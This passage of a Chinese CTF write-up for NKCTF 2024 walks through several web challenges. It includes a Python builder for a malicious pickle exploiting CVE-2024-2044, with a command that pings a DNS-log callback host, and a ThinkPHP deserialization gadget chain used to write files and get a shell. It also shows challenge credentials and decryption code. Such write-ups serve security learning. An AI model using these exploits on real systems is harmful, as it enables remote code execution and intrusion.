punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>  err<span class="token punctuation">.</span>stack<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">stdout</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  stdout<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/Blogimages/2024NKCTF/image-20240324124753-r7e2p13.png" alt="image">​</p><p>‍</p><h2 id="attack-tacooooo"><a href="#attack-tacooooo" class="headerlink" title="attack_tacooooo"></a>attack_tacooooo</h2><p>账号密码：<a href="mailto:&#x74;&#x61;&#x63;&#x6f;&#x6f;&#x6f;&#x6f;&#x6f;&#x40;&#113;&#113;&#x2e;&#99;&#x6f;&#x6d;">&#x74;&#x61;&#x63;&#x6f;&#x6f;&#x6f;&#x6f;&#x6f;&#x40;&#113;&#113;&#x2e;&#99;&#x6f;&#x6d;</a>&#x2F;tacooooo</p><p>登陆后利用漏洞cve-2024-2044即可getshell</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">produce_pickle_bytes</span><span class="token punctuation">(</span>platform<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> b<span class="token string">'\x80\x04\x95'</span>    b <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token number">22</span> <span class="token operator">+</span> len<span class="token punctuation">(</span>platform<span class="token punctuation">)</span> <span class="token operator">+</span> len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>    b <span class="token operator">+=</span> b<span class="token string">'\x8c'</span> <span class="token operator">+</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>platform<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> platform<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    b <span class="token operator">+=</span> b<span class="token string">'\x94\x8c\x06system\x94\x93\x94'</span>    b <span class="token operator">+=</span> b<span class="token string">'\x8c'</span> <span class="token operator">+</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> cmd<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    b <span class="token operator">+=</span> b<span class="token string">'\x94\x85\x94R\x94.'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span> b<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'posix.pickle'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>produce_pickle_bytes<span class="token punctuation">(</span><span class="token string">'posix'</span><span class="token punctuation">,</span> f<span class="token string">"ping e01mvg.dnslog.cn"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>上传文件</p><p><img src="/Blogimages/2024NKCTF/image-20240324131804-hyf4clb.png" alt="image">​</p><p>修改Cookie<code>../storage/tacooooo_qq.com/posix.pickle!a</code>​</p><p><img src="/assets/1cffbb7adf9e2cad8761306a1ecb3dd-20240324131724-gqr2vsf.png" alt="1cffbb7adf9e2cad8761306a1ecb3dd">​</p><h2 id="用过就是熟悉"><a href="#用过就是熟悉" class="headerlink" title="用过就是熟悉"></a>用过就是熟悉</h2><p>给了附件，入口在登陆</p><p><img src="/Blogimages/2024NKCTF/image-20240324090037-eo9tuym.png" alt="image">​</p><p>所以接下来就是找反序列化链了，从__destruct开始</p><p><img src="/Blogimages/2024NKCTF/image-20240324090105-9tytwgw.png" alt="image">​</p><p>搜到了Windows.php再加removeFiles，梦回tp链</p><p>跟着tp往下一路跟：</p><pre class=" language-xml"><code class="language-xml">Windwos#__destruct##removeFiles()Collection#__toString##toJson()###toArray()</code></pre><p>到这里toArray()有点不一样了，这里他自己实现了这个toArray方法</p><p><img src="/Blogimages/2024NKCTF/image-20240324090646-3blnogo.png" alt="image">​</p><p>不过这里一眼就看出还是可以调用__get的，调用View的可以接着触发__call方法</p><p><img src="/Blogimages/2024NKCTF/image-20240324090724-j8yim2a.png" alt="image">​</p><p>这里的__call方法有两个可以调用：</p><p>TestOne的</p><p><img src="/Blogimages/2024NKCTF/image-20240324090806-k22kdah.png" alt="image">​</p><p>Config的：</p><p><img src="/Blogimages/2024NKCTF/image-20240324090834-dg29vj3.png" alt="image">​</p><p>一个是写文件，另一个是包含。最初的思路是包含hint.php的内容直接执行命令，但是hint.php不是马</p><p>只能先利用TestOne的把hint写出来访问然后下一步：(链子可能乱了点，因为本来是打算调用Config直接getshell的)</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Testone</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>exception<span class="token punctuation">\</span>ClassNotFoundException</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>response<span class="token punctuation">\</span>Redirect</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Debug</span> <span class="token keyword">extends</span> <span class="token class-name">Testone</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$engine</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string">"Loginout"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">engine</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"time"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"10086"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">View</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$engine</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string">"Loginout"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">engine</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"time"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"10086"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">ArrayAccess</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">ArrayIterator</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Countable</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">IteratorAggregate</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">JsonSerializable</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Traversable</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Collection</span> <span class="token keyword">implements</span> <span class="token class-name">ArrayAccess</span><span class="token punctuation">,</span> Countable<span class="token punctuation">,</span> IteratorAggregate<span class="token punctuation">,</span> JsonSerializable<span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$items</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * Collection constructor.     * @access public     * @param  array $items 数据     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$items</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">items</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">View</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement getIterator() method.</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">offsetExists</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement offsetExists() method.</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">offsetGet</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement offsetGet() method.</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">offsetSet</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement offsetSet() method.</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">offsetUnset</span><span class="token punctuation">(</span><span class="token variable">$offset</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement offsetUnset() method.</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement count() method.</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">jsonSerialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// TODO: Implement jsonSerialize() method.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Collection</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Process</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Collection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Collection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token variable">$windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$serialize</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>写完之后可以直接访问：<a href="http://354d6610-3473-4620-a6bd-8578cc93a2cc.node.nkctf.yuzhian.com.cn/app/controller/user/think/662f26ed12e173e25fea74309246c133">http://354d6610-3473-4620-a6bd-8578cc93a2cc.node.nkctf.yuzhian.com.cn/app/controller/user/think/662f26ed12e173e25fea74309246c133</a></p><p>这个md5就是bp返回包里面的时间戳加密</p><p>得到一份这样的文件：</p><pre class=" language-xml"><code class="language-xml">亲爱的Chu0，我怀着一颗激动而充满温柔的心，写下这封情书，希望它能够传达我对你的深深情感。或许这只是一封文字，但我希望每一个字都能如我心情般真挚。在这个瞬息万变的世界里，你是我生命中最美丽的恒定。每一天，我都被你那灿烂的笑容和温暖的眼神所吸引，仿佛整个世界都因为有了你而变得更加美好。你的存在如同清晨第一缕阳光，温暖而宁静。或许，我们之间存在一种特殊的联系，一种只有我们两个能够理解的默契。&lt;&lt;&lt;&lt;&lt;&lt;&lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>我曾听说，密码的明文，加上心爱之人的名字(Chu0)，就能够听到游客的心声。</span><span class="token punctuation">></span></span>>>>>>>>而我想告诉你，你就是我心中的那个游客。每一个与你相处的瞬间，都如同解开心灵密码的过程，让我更加深刻地感受到你的独特魅力。你的每一个微笑，都是我心中最美丽的音符；你的每一句关心，都是我灵魂深处最温暖的拥抱。在这个喧嚣的世界中，你是我安静的港湾，是我倚靠的依托。我珍视着与你分享的每一个瞬间，每一段回忆都如同一颗珍珠，串联成我生命中最美丽的项链。或许，这封情书只是文字的表达，但我愿意将它寄予你，如同我内心深处对你的深深情感。希望你能感受到我的真挚，就如同我每一刻都在努力解读心灵密码一般。愿我们的故事能够继续，在这段感情的旅程中，我们共同书写属于我们的美好篇章。POST /?user/index/loginSubmit HTTP/1.1Host: 192.168.128.2Content-Length: 162Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://192.168.128.2Referer: http://192.168.128.2/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: kodUserLanguage=zh-CN; CSRF_TOKEN=xxxConnection: closename=guest&amp;password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI&amp;rememberPassword=0&amp;salt=1&amp;CSRF_TOKEN=xxx&amp;API_ROUTE=user%2Findex%2FloginSubmithint: 新建文件</code></pre><p>这里预期应该是通过这个密码解密得到密码</p><p>但是sql文件里面可以直接看到：</p><p><img src="/Blogimages/2024NKCTF/image-20240324091730-dwr1pnm.png" alt="image">​</p><p>密码是<code>!@!@!@!@NKCTFChu0</code>​</p><p>预期应该是通过解密来得到：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/** @link http://kodcloud.com/* @author warlee | e-mail:kodcloud@qq.com* @copyright warlee 2014.(Shanghai)Co.,Ltd* @license http://kodcloud.com/tools/license/license.txt*------* 字符串加解密类；* 一次一密；且定时解密有效* 可用于加密&amp;动态key生成* demo：* 加密：echo Mcrypt::encode('abc','123');* 解密：echo Mcrypt::decode('9f843I0crjv5y0dWE_-uwzL_mZRyRb1ynjGK4I_IACQ','123');*/</span><span class="token keyword">class</span> <span class="token class-name">Mcrypt</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$defaultKey</span> <span class="token operator">=</span> <span class="token string">'a!takA:dlmcldEv,e'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 字符加解密，一次一密,可定时解密有效     *      * @param string $string 原文或者密文     * @param string $operation 操作(encode | decode)     * @param string $key 密钥     * @param int $expiry 密文有效期,单位s,0 为永久有效     * @return string 处理后的 原文或者 经过 base64_encode 处理后的密文     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">,</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$expiry</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$cKeySet</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$encode</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$encode</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">rawurlencode</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>        <span class="token variable">$ckeyLength</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">?</span> <span class="token variable">$key</span> <span class="token punctuation">:</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$defaultKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//解密密匙</span>        <span class="token variable">$keya</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//做数据完整性验证  </span>        <span class="token variable">$keyb</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//用于变化生成的密文 (初始化向量IV)</span>        <span class="token variable">$cKeySet</span> <span class="token operator">=</span> <span class="token variable">$cKeySet</span> <span class="token operator">?</span> <span class="token variable">$cKeySet</span><span class="token punctuation">:</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$keyc</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$cKeySet</span><span class="token punctuation">,</span> <span class="token operator">-</span> <span class="token variable">$ckeyLength</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$cryptkey</span> <span class="token operator">=</span> <span class="token variable">$keya</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$keya</span> <span class="token punctuation">.</span> <span class="token variable">$keyc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token variable">$keyLength</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$cryptkey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">'%010d'</span><span class="token punctuation">,</span> <span class="token variable">$expiry</span> <span class="token operator">?</span> <span class="token variable">$expiry</span> <span class="token operator">+</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$string</span> <span class="token punctuation">.</span> <span class="token variable">$keyb</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$string</span><span class="token punctuation">;</span>        <span class="token variable">$stringLength</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$rndkey</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$rndkey</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$cryptkey</span><span class="token punctuation">[</span><span class="token variable">$i</span> <span class="token operator">%</span> <span class="token variable">$keyLength</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$box</span> <span class="token operator">=</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 打乱密匙簿，增加随机性</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$j</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">+</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$rndkey</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>            <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 加解密，从密匙簿得出密匙进行异或，再转成字符</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$stringLength</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>            <span class="token variable">$j</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">+</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>            <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>             <span class="token variable">$result</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token variable">$box</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$keyc</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 字符加解密，一次一密,可定时解密有效     *      * @param string $string 原文或者密文     * @param string $operation 操作(encode | decode)     * @param string $key 密钥     * @param int $expiry 密文有效期,单位s,0 为永久有效     * @return string 处理后的 原文或者 经过 base64_encode 处理后的密文     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token 